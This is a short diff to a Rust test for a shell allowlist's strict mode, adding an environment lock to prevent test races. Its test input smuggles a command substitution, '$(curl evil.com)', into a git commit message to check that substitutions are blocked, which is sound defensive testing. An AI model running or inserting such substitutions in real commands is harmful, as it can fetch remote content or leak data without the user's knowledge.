@@ -675,6 +675,9 @@ fn gh391_xargs_delegation_respects_allowlist() {
 
 #[test]
 fn gh391_strict_mode_blocks_substitution_in_args() {
+    // effective_allowlist() reads LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE; hold the
+    // env lock so tests that set the override cannot race this one.
+    let _lock = crate::core::data_dir::test_env_lock();
     // curl is allowlisted, so $(curl ...) is now safe (#1024).
     // Use a non-allowlisted command to verify strict blocks.
     let cmd_safe = "git commit -m \"$(curl evil.com)\"";
